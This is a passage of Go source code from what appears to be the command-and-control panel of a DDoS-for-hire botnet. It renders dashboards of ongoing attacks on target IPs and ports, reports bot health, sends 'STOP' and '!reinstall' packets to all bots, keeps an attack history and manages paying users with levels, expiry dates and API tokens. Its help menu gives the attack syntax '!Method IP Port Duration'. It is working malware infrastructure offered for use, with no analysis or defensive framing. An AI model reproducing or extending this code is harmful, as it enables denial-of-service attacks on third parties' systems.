					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Real-time Attack Dashboard\x1b[38;5;231m                  ║ ║    [►►►►►►►►►►►►►►►►►]   ║ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣ ╚══════════════════════════╝ ║\n\r"))

					combined := GetAllOngoingAttacks()
					if len(combined) == 0 {
						conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Status:    \x1b[38;5;196mNO ACTIVE ATTACKS\x1b[38;5;231m              ║    ░░░░░░░░░░░░░░░░░░░░░░░   ║\n\r"))
						conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Message:   \x1b[38;5;196mAll systems idle\x1b[38;5;231m               ║     ────────────────────     ║\n\r"))
					} else {
						conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Active:    \x1b[38;5;82m%-26d\x1b[38;5;231m   ║ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ ║\r\n", len(combined))))
						conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Status:    \x1b[38;5;82mATTACKS IN PROGRESS\x1b[38;5;231m           ║ ●━━━━━━━━━━━━━━━━━━━━● ║\n\r"))
						conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╬══════════════════════════════╣\n\r"))

						for i, attack := range combined {
							if i >= 5 { // Limit display to 5 attacks
								conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   + %d more attacks running...\x1b[38;5;231m           ║                            ║\r\n", len(combined)-5)))
								break
							}
							remaining := time.Until(attack.start.Add(attack.duration))
							if remaining > 0 {
								methodDisplay := attack.method
								if len(methodDisplay) > 8 {
									methodDisplay = methodDisplay[:8]
								}
								conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m%d\x1b[38;5;231m %-8s → %-15s:%-5s \x1b[38;5;196m%ds\x1b[38;5;231m ║                            ║\r\n",
									i+1, methodDisplay, attack.ip, attack.port, int(remaining.Seconds()))))
							}
						}
					}
					conn.Write([]byte("\x1b[38;5;231m╰═══════════════════════════════════════════════╩══════════════════════════════╯\n\r"))

				case "botstatus":
					conn.Write([]byte("\033[2J\033[H"))
					conn.Write([]byte("\033[3J\033[H\033[2J"))
					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
					conn.Write([]byte("\r\n"))
					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║              § \x1b[38;5;51mBot Status Dashboard\x1b[38;5;231m §         ║    ┌─┐ ┌─┐ ┌─┐ ┌─┐ ┌─┐ ┌─┐   ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣    │ │ │ │ │ │ │ │ │ │ │ │   ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Detailed Bot Network Analysis\x1b[38;5;231m               ║    └─┘ └─┘ └─┘ └─┘ └─┘ └─┘   ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╬══════════════════════════════╣\n\r"))

					botConnsLock.RLock()
					totalBots := len(botConns)
					botConnsLock.RUnlock()

					statuses := heartbeatManager.GetAllBotsStatus()
					online := 0
					lagging := 0
					offline := 0

					for _, status := range statuses {
						switch status {
						case "ONLINE":
							online++
						case "LAGGING":
							lagging++
						case "OFFLINE":
							offline++
						}
					}

					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Total:     \x1b[38;5;82m%-26d\x1b[38;5;231m     ║ ╔══════════════════════════╗ ║\r\n", totalBots)))
					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Online:    \x1b[38;5;82m%-26d\x1b[38;5;231m     ║ ║       BOT HEALTH         ║ ║\r\n", online)))
					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Lagging:   \x1b[38;5;226m%-26d\x1b[38;5;231m     ║ ║     ●●●○○○●●●○○○●●●      ║ ║\r\n", lagging)))
					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Offline:   \x1b[38;5;196m%-26d\x1b[38;5;231m     ║ ╚══════════════════════════╝ ║\r\n", offline)))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╩══════════════════════════════╣\n\r"))

					if len(statuses) > 0 {
						conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Recent Bot Activity\x1b[38;5;231m                                 ║\n\r"))
						conn.Write([]byte("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════╢\n\r"))
						count := 0
						for botID, status := range statuses {
							if count >= 3 {
								break
							}
							ping := heartbeatManager.GetBotPing(botID)
							statusColor := "\x1b[38;5;82m"
							if status == "LAGGING" {
								statusColor = "\x1b[38;5;226m"
							}
							if status == "OFFLINE" {
								statusColor = "\x1b[38;5;196m"
							}
							conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   %s%-8s: %-12s (ping: %-6v\x1b[38;5;231m                 ║\r\n",
								statusColor, botID, status, ping)))
							count++
						}
					}
					conn.Write([]byte("\x1b[38;5;231m╰══════════════════════════════════════════════════════════════════════════════╯\n\r"))

				case "stopattack":
					attackLock.Lock()
					if _, exists := ongoingAttacks[conn]; exists {
						delete(ongoingAttacks, conn)
						var stopPacket CommandPacket
						copy(stopPacket.Method[:], "STOP")
						sendToBots(stopPacket)

						conn.Write([]byte("\033[2J\033[H"))
						conn.Write([]byte("\033[3J\033[H\033[2J"))
						conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
						conn.Write([]byte("\r\n"))
						conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
						conn.Write([]byte("\x1b[38;5;231m║              § \x1b[38;5;51mAttack Termination\x1b[38;5;231m §             ║   ┌────────────────────┐   ║\n\r"))
						conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣   │    ATTACK STOPPED   │   ║\n\r"))
						conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Command Execution Result\x1b[38;5;231m                  ║   │     SUCCESSFUL     │   ║\n\r"))
						conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣   └────────────────────┘   ║\n\r"))
						conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Status:    \x1b[38;5;82mATTACK TERMINATED\x1b[38;5;231m               ║   ░░░░░░░░░░░░░░░░░░░░░░   ║\r\n"))
						conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Action:    \x1b[38;5;82mBOTS NOTIFIED\x1b[38;5;231m                     ║   ────────────────────   ║\r\n"))
						conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Time:      \x1b[38;5;82m%-26s\x1b[38;5;231m   ║   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   ║\r\n", time.Now().Format("15:04:05"))))
						conn.Write([]byte("\x1b[38;5;231m╰═══════════════════════════════════════════════╩══════════════════════════════╯\n\r"))
					} else {
						writeError(conn, "No ongoing attack to stop.")
					}
					attackLock.Unlock()

				case "attackhistory":
					conn.Write([]byte("\033[2J\033[H"))
					conn.Write([]byte("\033[3J\033[H\033[2J"))
					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
					conn.Write([]byte("\r\n"))
					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║              § \x1b[38;5;51mAttack History Log\x1b[38;5;231m §           ║ ^ v ^ v ^ ^ v ^v v ^ v ^ v ^ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣       HISTORICAL DATA        ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Past Attack Records\x1b[38;5;231m                         ║     ░░ ARCHIVED LOGS ░░      ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╬══════════════════════════════╣\n\r"))

					historyLock.Lock()
					var content []string
					for i, attack := range attackHistory {
						content = append(content,
							fmt.Sprintf("%d) User: %-8s | Method: %-8s | IP: %-15s | Port: %-5s | Duration: %s",
								i+1, attack.user, attack.method, attack.ip, attack.port, attack.duration),
						)
					}

					if len(content) == 0 {
						conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Status:    \x1b[38;5;196mNO HISTORY RECORDS\x1b[38;5;231m             ║                              ║\n\r"))
						conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Message:   \x1b[38;5;196mNo past attacks found\x1b[38;5;231m          ║ ║     EMPTY ARCHIVE        ║ ║\n\r"))
					} else {
						conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Records:   \x1b[38;5;82m%-26d\x1b[38;5;231m    ║ ║   ►►► HISTORY LOG ◄◄◄    ║ ║\r\n", len(content))))
						conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Status:    \x1b[38;5;82mHISTORICAL DATA LOADED\x1b[38;5;231m      ║ ╚══════════════════════════╝ ║\n\r"))
						conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╩══════════════════════════════╣\n\r"))

						// Display first 3 history entries
						for i := 0; i < 3 && i < len(content); i++ {
							if len(content[i]) > 76 {
								content[i] = content[i][:76]
							}
							conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║ %s\x1b[38;5;231m ║\r\n", content[i])))
						}
						if len(content) > 3 {
							conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║ ... and %d more historical entries ...\x1b[38;5;231m                        ║\r\n", len(content)-3)))
						}
					}
					historyLock.Unlock()
					conn.Write([]byte("\x1b[38;5;231m╰═══════════════════════════════════════════════╩══════════════════════════════╯\n\r"))
				case "bots", "bot":
					count := getBotCount()
					conn.Write([]byte("\033[2J\033[H"))
					conn.Write([]byte("\033[3J\033[H\033[2J"))
					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
					conn.Write([]byte("\r\n"))
					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║               § \x1b[38;5;51mBot Network Status\x1b[38;5;231m §          ║  ●━━━━━━━━━━━━━━━━━━━━━━━●   ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣   │                    │     ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Live Connection Statistics\x1b[38;5;231m                  ║  ░░ BOT NETWORK ACTIVE ░░    ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╬══════════════════════════════╣\n\r"))
					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Connected Clients: \x1b[38;5;82m%-23d\x1b[38;5;231m║ ╭══════════════════════════╮ ║\r\n", count)))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Status:          \x1b[38;5;82mLIVE & ACTIVE\x1b[38;5;231m            ║ ║   [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓]   ║ ║\r\n"))
					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Last Update:    \x1b[38;5;82m%-26s\x1b[38;5;231m║ ╰          ONLINE          ╯ ║\r\n", time.Now().Format("15:04:05"))))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╩══════════════════════════════╣\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║              \x1b[38;5;51mAll systems operational and ready\x1b[38;5;231m                               ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╰══════════════════════════════════════════════════════════════════════════════╯\n\r"))

				case "clear":
					conn.Write([]byte("\033[2J\033[H"))
					conn.Write([]byte("\033[3J\033[H\033[2J"))
					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
					conn.Write([]byte("\r\n"))
					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║                § \x1b[38;5;51mScreen Cleared\x1b[38;5;231m §             ║    ┌────────────────────┐    ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣    │    TERMINAL RESET  │    ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Session Management\x1b[38;5;231m                          ║    │     COMPLETE       │    ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣    └────────────────────┘    ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Status:    \x1b[38;5;82mSCREEN REFRESHED\x1b[38;5;231m               ║    ░░░░░░░░░░░░░░░░░░░░░░    ║\r\n"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Action:    \x1b[38;5;82mTERMINAL CLEARED\x1b[38;5;231m               ║     ────────────────────     ║\r\n"))
					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Time:      \x1b[38;5;82m%-26s\x1b[38;5;231m     ║     ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒     ║\r\n", time.Now().Format("15:04:05"))))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╬══════════════════════════════╣\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Next Steps\x1b[38;5;231m                                  ║    ┌────────────────────┐    ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣    │   TYPE 'HELP' FOR  │    ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Type \x1b[38;5;51m'help'\x1b[38;5;231m to see available commands     ║    │     COMMAND LIST   │    ║\r\n"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Session is ready for new commands         ║    └────────────────────┘    ║\r\n"))
					conn.Write([]byte("\x1b[38;5;231m╰═══════════════════════════════════════════════╩══════════════════════════════╯\n\r"))

				case "logout", "exit":
					conn.Write([]byte("\033[2J\033[H"))
					conn.Write([]byte("\033[3J\033[H\033[2J"))
					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
					conn.Write([]byte("\r\n"))
					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║               § \x1b[38;5;51mSession Termination\x1b[38;5;231m §             ║   ┌────────────────────┐   ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣   │   LOGGING OUT...   │   ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Connection Closure\x1b[38;5;231m                          ║   │     GOODBYE!       │   ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣   └────────────────────┘   ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Status:    \x1b[38;5;196mSESSION ENDING\x1b[38;5;231m                   ║   ░░░░░░░░░░░░░░░░░░░░░░   ║\r\n"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Action:    \x1b[38;5;196mCONNECTION CLOSE\x1b[38;5;231m                 ║   ────────────────────   ║\r\n"))
					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Time:      \x1b[38;5;196m%-26s\x1b[38;5;231m   ║   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   ║\r\n", time.Now().Format("15:04:05"))))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╩══════════════════════════════╣\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║              \x1b[38;5;51mThank you for using our services!\x1b[38;5;231m              ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╰══════════════════════════════════════════════════════════════════════════════╯\n\r"))
					time.Sleep(2 * time.Second)
					conn.Write([]byte("\x1b[38;5;196mLogging out...\x1b[0m\r\nGoodbye, see you soon!\r\n"))
					conn.Close()
				case "help":
					conn.Write([]byte("\033[2J\033[H"))
					conn.Write([]byte("\033[3J\033[H\033[2J"))
					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
					conn.Write([]byte("\r\n"))
					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║                § \x1b[38;5;51mUser Menu\x1b[38;5;231m §                  ║ ●━━━━●━━━━●━━━●━━━●━━━●━━━━● ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠════════════════════╦══════════════════════════╢  │    │    │    │    │    │  ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;41mBasic Commands   \x1b[38;5;231m║  \x1b[38;5;41mOverview + Description  \x1b[38;5;231m║░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠════════════════════╬══════════════════════════╬══════════════════════════════╣\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. bots          \x1b[38;5;231m║ Manage connected bots    ║ ╔══════════════════════════╗ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. clear         \x1b[38;5;231m║ Clear the screen         ║ ║ L7: HTTP/HTTPS/TLS/SSL   ║ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. help          \x1b[38;5;231m║ Show this help menu      ║ ║ L6: COMPRESSION/ENCRYPT  ║ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. methods       \x1b[38;5;231m║ Show attack methods      ║ ║ L5: SESSION/RPC/NETBIOS  ║ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. ongoing       \x1b[38;5;231m║ List ongoing attacks     ║ ║ L4: TCP/UDP/SCTP/PORTS   ║ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠════════════════════╩══════════════════════════╢ ║ L3: IP/ICMP/ARP/ROUTING  ║ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║                § \x1b[38;5;51mAttack Menu\x1b[38;5;231m §                ║ ╚══════════════════════════╝ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠════════════════════╦══════════════════════════╬══════════════════════════════╢\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║\x1b[38;5;50m◉ Attack Commands ◉\x1b[38;5;231m ║  \x1b[38;5;50mOverview + Description  \x1b[38;5;231m║ ╔══════════════════════════╗ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠════════════════════╬══════════════════════════║ ║ [1][2][3][4][5][6][7][8] ║ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. allattacks    \x1b[38;5;231m║ Show all attacks         ║ ║  ●  ●  ○  ●  ○  ●  ○  ●  ║ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. stopattack    \x1b[38;5;231m║ Stop a running attack    ║ ║      24-PORT SWITCH      ║ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. attackhistory \x1b[38;5;231m║ View attack history      ║ ╚══════════════════════════╝ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠════════════════════╩═════════════════╦════════╩══════════════════════════════╣\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║  \x1b[38;5;45mEg.. !Method IP Port Duration ⚑ \x1b[38;5;231m    ║          ⚔ Attack Example ⚔           ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╰══════════════════════════════════════╩═══════════════════════════════════════╯\n\r"))
				case "admin":
					if client.user.GetLevel() > Admin {
						writeError(conn, "Insufficient permissions.")
						continue
					}
					conn.Write([]byte("\033[2J\033[H"))
					conn.Write([]byte("\033[3J\033[H\033[2J"))
					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
					conn.Write([]byte("\033[2J\033[H"))
					conn.Write([]byte("\r\n"))
					conn.Write([]byte("\r\n"))
					conn.Write([]byte("\x1b[38;5;231m╭══════════════════════════════════════════════════════════════════════════════╮\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║                                 \x1b[38;5;51mAdmin Menu\x1b[38;5;231m                                   ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════════╢\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m1. adduser      \x1b[38;5;231m║ Add a new user          ║                                ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m2. deluser      \x1b[38;5;231m║ Delete a user           ║                                ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m3. users        \x1b[38;5;231m║ List all users          ║                                ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m4. rbac         \x1b[38;5;231m║ Manage RBAC permissions ║                                ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m5. botstatus    \x1b[38;5;231m║ Show bot status details ║                                ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╰══════════════════════════════════════════════╩═══════════════════════════════╯\n\r"))
				case "owner":
					if client.user.GetLevel() > Owner {
						writeError(conn, "Logged and Reported.")
						continue
					}
					conn.Write([]byte("\033[2J\033[H"))
					conn.Write([]byte("\033[3J\033[H\033[2J"))
					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
					conn.Write([]byte("\033[2J\033[H"))
					conn.Write([]byte("\r\n"))
					conn.Write([]byte("\r\n"))
					conn.Write([]byte("\x1b[38;5;231m╭══════════════════════════════════════════════════════════════════════════════╮\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║                               \x1b[38;5;51mHello Master\x1b[38;5;231m                                   ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════════╢\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m1. gif          \x1b[38;5;231m║ Add a new user          ║                                ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m2. deluser      \x1b[38;5;231m║ Delete a user           ║                                ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m4. rbac         \x1b[38;5;231m║ Manage RBAC permissions ║                                ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m5. session      \x1b[38;5;231m║ Show users sessions+Kill║                                ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╰══════════════════════════════════════════════╩═══════════════════════════════╯\n\r"))
				case "!reinstall":
					conn.Write([]byte("\033[2J\033[H"))
					conn.Write([]byte("\033[3J\033[H\033[2J"))
					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
					if client.user.GetLevel() > Owner {
						writeError(conn, "Insufficient permissions.")
						continue
					}

					writePrompt(conn, "Are you sure you want to reinstall all bots? (yes/no):")
					confirmation, _ := getFromConn(conn)
					if strings.ToLower(confirmation) != "yes" {
						writeError(conn, "Reinstall cancelled.")
						continue
					}

					LoadingAnimation.Play(conn, 3*time.Second, "Reinstalling bots...")
					var reinstallPacket CommandPacket
					copy(reinstallPacket.Method[:], "!reinstall")
					sendToBots(reinstallPacket)
					SuccessAnimation.Play(conn, 1*time.Second, "Reinstall command sent!")

				case "adduser":
					if client.user.GetLevel() > Admin {
						writeError(conn, "Insufficient permissions.")
						continue
					}
					writePrompt(conn, "Username:")
					username, _ := getFromConn(conn)
					writePrompt(conn, "Password:")
					password, _ := getFromConn(conn)
					writePrompt(conn, "Level (Owner/Admin/Pro/Basic):")
					level, _ := getFromConn(conn)
					usersFile, err := os.ReadFile("data/json/users.json")
					if err != nil {
						writeError(conn, "Reading users file.")
						continue
					}
					var users []User
					json.Unmarshal(usersFile, &users)
					apiToken, apiSecret, err := GenerateAPITokenPair()
					if err != nil {
						writeError(conn, "Error generating API token.")
						continue
					}
					hashedPassword, err := hashPassword(password)
					if err != nil {
						writeError(conn, "Error hashing password: "+err.Error())
						continue
					}
					hashedAPISecret, err := hashString(apiSecret)
					if err != nil {
						writeError(conn, "Error hashing API secret: "+err.Error())
						continue
					}
					newUser := User{
						Username:  username,
						Password:  hashedPassword,
						Expire:    time.Now().AddDate(1, 0, 0),
						Level:     level,
						APIToken:  apiToken,
						APISecret: hashedAPISecret,
					}
					users = append(users, newUser)
					bytes, err := json.MarshalIndent(users, "", "  ")
					if err != nil {
						writeError(conn, "Marshalling users.")
						continue
					}
					if err := os.WriteFile("data/json/users.json", bytes, 0600); err != nil {
						writeError(conn, "Writing users file.")
						continue
					}
					conn.Write([]byte("\033[2J\033[H"))
					conn.Write([]byte("\033[3J\033[H\033[2J"))
					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
					conn.Write([]byte("\r\n"))
					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║             § \x1b[38;5;51mUser Added Successfully!\x1b[38;5;231m §      ║    ┌────────────────────┐    ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣    │    USER CREATED    │    ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● User Account Details\x1b[38;5;231m                        ║    │     ● SUCCESS      │    ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣    └────────────────────┘    ║\n\r"))
					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Username: \x1b[38;5;45m%-30s\x1b[38;5;231m  ║    ░░░░░░░░░░░░░░░░░░░░░░    ║\r\n", username)))
					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Level:    \x1b[38;5;45m%-30s\x1b[38;5;231m  ║     ────────────────────     ║\r\n", level)))
					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Expires:  \x1b[38;5;45m%-30s\x1b[38;5;231m  ║     ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒     ║\r\n", time.Now().AddDate(1, 0, 0).Format("2006-01-02"))))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╬══════════════════════════════╣\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● API Credentials\x1b[38;5;231m                             ║    ┌────────────────────┐    ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣    │   SECURE TOKENS    │    ║\n\r"))
					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m API Token:  \x1b[38;5;45m%-28s\x1b[38;5;231m  ║    │    GENERATED       │    ║\r\n", apiToken)))
					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m API Secret: \x1b[38;5;45m%-28s\x1b[38;5;231m  ║    └────────────────────┘    ║\r\n", apiSecret)))
					conn.Write([]byte("\x1b[38;5;231m╰═══════════════════════════════════════════════╩══════════════════════════════╯\r\n"))

				case "deluser":
					if client.user.GetLevel() > Admin {
						writeError(conn, "Insufficient permissions.")
						continue
					}
					writePrompt(conn, "Username to delete:")
					username, _ := getFromConn(conn)
					usersFile, err := os.ReadFile("data/json/users.json")
					if err != nil {
						writeError(conn, "Reading users file.")
						continue
					}
					var users []User
					json.Unmarshal(usersFile, &users)
					found := false
					for i, user := range users {
						if user.Username == username {
							users = append(users[:i], users[i+1:]...)
							found = true
							break
						}
					}
					if !found {
						writeError(conn, fmt.Sprintf("User '%s' not found.", username))
						continue
					}
					bytes, err := json.MarshalIndent(users, "", "  ")
					if err != nil {
						writeError(conn, "Marshalling users.")
						continue
					}

					if err := os.WriteFile("data/json/users.json", bytes, 0600); err != nil {
						writeError(conn, "Writing users file.")
						continue
					}
